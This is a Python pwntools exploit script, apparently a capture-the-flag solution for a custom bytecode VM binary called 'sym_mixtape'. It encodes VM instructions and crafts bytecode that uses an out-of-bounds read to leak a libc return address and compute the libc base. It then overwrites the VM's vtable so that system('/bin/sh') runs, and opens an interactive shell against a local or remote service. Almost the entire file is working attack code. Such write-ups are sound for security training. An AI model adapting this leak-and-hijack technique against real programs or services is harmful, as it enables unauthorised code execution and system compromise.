#!/usr/bin/env python3

# type: ignore
# flake8: noqa

import tempfile
from base64 import b64encode

from pwn import *

elf = context.binary = ELF("./sym_mixtape.386", checksec=False)
libc = elf.libc
context.terminal = ["tmux", "neww"]


def VM_NEXT_INSN(op1=0, op2=0, op3=0):
    return p8(0) + p8(op1) + p8(op2) + p8(op3)


def VM_MOV_R_MEM(r_dest, r_base, offset):
    """
    mov r_op1, mem[r_op2+op3]
    """
    return p8(1) + p8(r_dest) + p8(r_base) + p8(offset)


def VM_MOV_MEM_R(r_src, r_base, offset):
    """
    mov r_op1, mem[r_op2+op3]
    """
    return p8(2) + p8(r_src) + p8(r_base) + p8(offset)


def VM_SHUFFLE_VTABLES(op1, r_op2, op3):
    return p8(3) + p8(op1) + p8(r_op2) + p8(op3)


def VM_SHUFFLE_REGS(op1, r_op2, op3):
    """
    op1 = number of regs
    """
    return p8(4) + p8(op1) + p8(r_op2) + p8(op3)


def VM_EXIT(op1=0, op2=0, op3=0):
    """
    exit
    """
    return p8(5) + p8(op1) + p8(op2) + p8(op3)


def VM_SET_R_16(r_dest, imm):
    """
    set lowest 16-bit
    """
    return p8(6) + p8(r_dest) + p16(imm)


def VM_SET_R_32(r_dest, imm):
    """
    or r_op1, op2 << 16
    set bit 16 to 31
    """
    return p8(7) + p8(r_dest) + p16(imm)


def VM_SET_R_48(r_dest, imm):
    """
    or r_op1, op2 << 32
    set bit 32 to 47
    """
    return p8(8) + p8(r_dest) + p16(imm)


def VM_SET_R_64(r_dest, imm):
    """
    or r_op1, op2 << 48
    set bit 48 to 63
    """
    return p8(9) + p8(r_dest) + p16(imm)


def VM_CMP_R_R(r_dest, r_op2, r_op3):
    """
    if r_op2 == r_op3 then r_dest = 1
    if r_op2 < r_op3 then r_dest = 2
    else r_dest = 0
    """
    return p8(10) + p8(r_dest) + p8(r_op2) + p8(r_op3)


def VM_CMP_R_IMM(r_dest, r_op2, imm):
    """
    if r_op2 == imm then r_dest = 1
    if r_op2 < imm then r_dest = 2
    else r_dest = 0
    """
    return p8(11) + p8(r_dest) + p8(r_op2) + p8(imm)


def VM_SET_R0(r_op1, imm):
    """
    lea r0, [r_op1+imm]
    """
    return p8(12) + p8(r_op1) + p16(imm)


def VM_ADD_R_R_R(r_dest, r_op2, r_op3):
    return p8(19) + p8(r_dest) + p8(r_op2) + p8(r_op3)


def VM_ADD_R_R_IMM(r_dest, r_op2, op3):
    return p8(20) + p8(r_dest) + p8(r_op2) + p8(op3)


def VM_SUB_R_R_R(r_dest, r_op2, r_op3):
    return p8(21) + p8(r_dest) + p8(r_op2) + p8(r_op3)


def VM_SUB_R_R_IMM(r_dest, r_op2, op3):
    return p8(22) + p8(r_dest) + p8(r_op2) + p8(op3)


def VM_AND_R_R_IMM(r_dest, r_op2, op3):
    return p8(30) + p8(r_dest) + p8(r_op2) + p8(op3)


def VM_XOR_R_R_R(r_dest, r_op2, r_op3):
    return p8(31) + p8(r_dest) + p8(r_op2) + p8(r_op3)


def VM_PUTC(op1, r_op2, op3):
    return p8(33) + p8(op1) + p8(r_op2) + p8(op3)


def VM_GETC(op1, r_op2, op3):
    return p8(34) + p8(op1) + p8(r_op2) + p8(op3)


def VM_SETB_MEM_R(r_op1, r_op2, op3):
    return p8(36) + p8(r_op1) + p8(r_op2) + p8(op3)


def VM_SHL_R_R_IMM(r_dest, r_op2, op3):
    return p8(38) + p8(r_dest) + p8(r_op2) + p8(op3)


def start(argv=[], *a, **kw):
    nc = "nc gold.b01le.rs 4003"
    nc = "nc localhost 5000"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
source ~/.gdbinit-gef-bata24.py
b *exec_vm
# b *exec_vm+0x71
b *vm_rearrange_vtable+87
tb *vm_rearrange_regs
c  # exec_vm
memory watch $rdi+0x138 0x100 qword
memory watch $rdi+0x938 0x100 dword
c
# b *exec_vm+0x71
"""


with tempfile.NamedTemporaryFile("wb") as f:
    bytecode = b""

    # jump to insn @ 0x400 to leak libc
    bytecode += VM_SET_R0(0x10, 0x400)

    # writing insn @ 0x87
    bytecode = bytecode.ljust(0x87, b"\x00")
    for i in range(1, 6):
        bytecode += VM_AND_R_R_IMM(i, i, 0xFF)

    # combine everything into one register r10
    bytecode += VM_XOR_R_R_R(0x10, 0x10, 0x10)
    for i in range(1, 6):
        bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)
        bytecode += VM_ADD_R_R_R(0x10, 0x10, 6 - i)
    bytecode += VM_SHL_R_R_IMM(0x10, 0x10, 0x8)

    # set __libc_start_main_ret offset to r11
    bytecode += VM_SET_R_16(0x11, 0x4000)
    bytecode += VM_SET_R_32(0x11, 0x2)
    bytecode += VM_SUB_R_R_R(0x10, 0x10, 0x11)
    # now r10 = libc base address

    system = libc.sym["system"]

    bytecode += VM_XOR_R_R_R(0x15, 0x15, 0x15)
    # set system function offset to r15
    bytecode += VM_SET_R_16(0x15, system & 0xFFFF)
    bytecode += VM_SET_R_32(0x15, (system >> 16) & 0xFFFF)
    bytecode += VM_XOR_R_R_R(0x13, 0x13, 0x13)
    bytecode += VM_ADD_R_R_R(0x13, 0x10, 0x15)

    # set /bin/sh string to r14
    bytecode += VM_XOR_R_R_R(0x14, 0x14, 0x14)
    bytecode += VM_SET_R_16(0x14, u16(b"/b"))
    bytecode += VM_SET_R_32(0x14, u16(b"in"))
    bytecode += VM_SET_R_48(0x14, u16(b"/s"))
    bytecode += VM_SET_R_64(0x14, u16(b"h\x00"))

    # write 0x6f @ bytecode[0x4000]
    # write 0x6e @ bytecode[0x4001]
    bytecode += VM_XOR_R_R_R(0x11, 0x11, 0x11)
    bytecode += VM_SET_R_16(0x11, 0x4000)
    bytecode += VM_SET_R_16(0x12, 0x6F)
    bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x00)
    bytecode += VM_SET_R_16(0x12, 0x6E)
    bytecode += VM_SETB_MEM_R(0x12, 0x11, 0x01)
    # shuffle vtable where vm->vtable[0] = vtable[0x6f] which contains
    # /bin/sh string address and vm->vtable[1] = vtable[0x6e] which contains
    # system function address
    bytecode += VM_SHUFFLE_VTABLES(0x2, 0x11, 0x00)

    # call system
    bytecode += VM_MOV_R_MEM(0, 0, 0)
    bytecode += VM_EXIT()

    bytecode = bytecode.ljust(0x400, b"\x00")
    for i in range(1, 256):
        bytecode += VM_SET_R_16(i, i)
    # oob read @ bytecode[0x8010] == __libc_start_main_ret
    bytecode += VM_SET_R_16(0x18, 0x8010)
    # __libc_start_main_ret bytes goes into r0, r1, r2, r3, r4, r5, r6
    # r0 is 0x83 so after shuffle, we execute insn at 0x87
    bytecode += VM_SHUFFLE_REGS(6, 0x18, 0)

    f.write(bytecode)
    f.flush()

    io = start(argv=[f.name])
    if args.REMOTE:
        io.sendlineafter(b">> ", b64encode(bytecode))

    io.interactive()
